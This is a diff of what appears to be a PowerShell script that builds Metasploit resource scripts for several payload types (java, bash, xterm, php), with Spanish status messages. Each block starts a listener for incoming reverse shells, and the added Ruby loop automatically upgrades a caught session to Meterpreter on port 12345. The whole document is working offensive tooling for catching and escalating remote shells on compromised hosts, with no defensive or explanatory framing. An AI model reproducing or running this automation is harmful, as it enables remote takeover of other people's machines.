@@ -23,31 +23,26 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-# The first sleep below is not necessary, but makes the output cleaner
 <ruby>
-	sleep(1)
+x = 0
+    sleep(1)
 
-	print_status("Esperando session para actualizarla a meterpreter")
-	while (true)
-		framework.sessions.each_pair do |sid,s|
-			thost = s.session_host
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
 
-			# Ensure that stdapi has been loaded before running
-			if s.ext.aliases['stdapi']
-				print_status("Detectada nueva session")
-				s.console.run_single("use post/multi/manage/shell_to_meterpreter")
-                s.console.run_single("set LHOST $LHOST")
-                s.console.run_single("set LPORT 12345")
-                s.console.run_single("exploit")
-			else
-				print_status("Session #{sid} #{thost} active, but not yet configured")
-			end
-
-		end
-		sleep(1)
-	end
-
-	print_status("All done")
+    print_status("Shell actualizada a meterpreter")
 </ruby>
 "@
 
@@ -58,10 +53,27 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
+<ruby>
+x = 0
+    sleep(1)
+
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
+
+    print_status("Shell actualizada a meterpreter")
+</ruby>
 "@
 
 $metasploit_java = @"
@@ -71,10 +83,27 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
+<ruby>
+x = 0
+    sleep(1)
+
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
+
+    print_status("Shell actualizada a meterpreter")
+</ruby>
 "@
 
 $metasploit_bash = @"
@@ -84,10 +113,27 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
+<ruby>
+x = 0
+    sleep(1)
+
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
+
+    print_status("Shell actualizada a meterpreter")
+</ruby>
 "@
 
 $metasploit_xterm = @"
@@ -97,10 +143,27 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
+<ruby>
+x = 0
+    sleep(1)
+
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
+
+    print_status("Shell actualizada a meterpreter")
+</ruby>
 "@
 
 $metasploit_php = @"
@@ -110,10 +173,27 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
+<ruby>
+x = 0
+    sleep(1)
+
+    print_status("Esperando session para actualizarla a meterpreter")
+    while (x == 0)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.session_host
+            print_status("Detectada nueva session")
+                self.run_single("use post/multi/manage/shell_to_meterpreter")
+                self.run_single("set session 1")
+                        self.run_single("set LHOST $Lhost")
+                        self.run_single("set LPORT 12345")
+                        self.run_single("exploit")
+        x += 2
+        end
+        sleep(1)
+    end
+
+    print_status("Shell actualizada a meterpreter")
+</ruby>
 "@
 
 $banner1 = @"
